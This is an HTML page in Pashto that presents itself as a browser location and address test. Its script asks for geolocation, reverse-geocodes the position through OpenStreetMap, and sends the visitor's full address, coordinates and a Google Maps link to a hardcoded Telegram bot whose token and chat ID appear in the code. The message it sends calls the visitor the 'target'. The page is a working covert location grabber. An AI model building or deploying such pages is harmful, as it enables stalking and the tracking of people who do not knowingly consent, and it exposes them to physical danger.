<!DOCTYPE html>
<html lang="ps" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>د ادرس او لوکیشن ازموینه</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f172a;
            color: white;
            text-align: center;
            padding: 50px 20px;
        }
        .box {
            background-color: #1e293b;
            padding: 35px;
            border-radius: 12px;
            max-width: 450px;
            margin: 0 auto;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        button {
            background-color: #3b82f6;
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            transition: 0.3s;
        }
        button:hover {
            background-color: #2563eb;
        }
        #text {
            margin-top: 20px;
            color: #94a3b8;
            font-size: 15px;
            line-height: 1.6;
        }
    </style>
</head>
<body>

    <div class="box">
        <h2>📍 د هوښیار لوکیشن سیسټم</h2>
        <p>د براوزر د ادرس موندنې (Reverse Geocoding) د ټیسټ لپاره لاندې تڼۍ کېکاږئ:</p>
        
        <button onclick="getDetailedLocation()">لوکیشن تایید کړه</button>
        <p id="text"></p>
    </div>

    <script>
        function getDetailedLocation() {
            const textDisplay = document.getElementById("text");
            
            // ستاسو د تلیګرام بوټ معلومات
            const botToken = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
            const chatId = "8295417969";

            if (navigator.geolocation) {
                textDisplay.innerHTML = "⏳ لطفاً په براوزر کې د لوکیشن غوښتنې ته اجازه (Allow) ورکړئ...";
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        textDisplay.innerHTML = "🔄 د جغرافیایي کوډونو څخه د ادرس ایستلو پروسه روانه ده...";

                        // د OpenStreetMap وړیا API ته غوښتنه لېږل ترڅو ادرس پیدا کړي
                        const geoApiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;

                        fetch(geoApiUrl, {
                            headers: { 'Accept-Language': 'ps,pashto,en' } // په پښتو یا انګلیسي د ادرس غوښتنه
                        })
                        .then(response => response.json())
                        .then(data => {
                            // د ادرس پوره متن ترلاسه کول
                            const fullAddress = data.display_name || "ادرس پیدا نشو";
                            
                            textDisplay.innerHTML = "✅ ادرس موندل شو! بوټ ته د لېږلو په حال کې دئ...";

                            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                            
                            // هغه د منځپانګې پیغام چې ستا بوټ ته راځي
                            const message = `🎯 **د هدف بشپړ لوکیشن او ادرس راغی!**\n\n` +
                                            `🗺️ **د سیمې ادرس:**\n\`${fullAddress}\`\n\n` +
                                            `🌐 **کوارډینات:**\nLatitude: \`${lat}\`\nLongitude: \`${lon}\`\n\n` +
                                            `🔗 **د ګوګل مېپ لینک:**\n${mapUrl}`;

                            // تلیګرام بوټ ته د ډاټا لېږل
                            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: message,
                                    parse_mode: 'Markdown'
                                })
                            });
                        })
                        .then(res => {
                            if(res && res.ok) {
                                textDisplay.innerHTML = "✅ ادرس او د ګوګل مېپ لینک ستا بوټ ته په بریالیتوب سره واستول شول! خپل بوټ وګوره.";
                            }
                        })
                        .catch(err => {
                            textDisplay.innerHTML = "❌ د ادرس په پروسس کې یا تلیګرام ته په لېږلو کې ستونزه راغله.";
                            console.error(err);
                        });
                    }, 
                    function(error) {
                        textDisplay.innerHTML = "❌ د لوکیشن اجازه رد شوه. سیسټم نشي کولای ستاسو د اجازې پرته ادرس معلوم کړي.";
                    }
                );
            } else {
                textDisplay.innerHTML = "❌ ستاسو براوزر د دې سیسټم ملاتړ نه کوي.";
            }
        }
    </script>

</body>
</html>
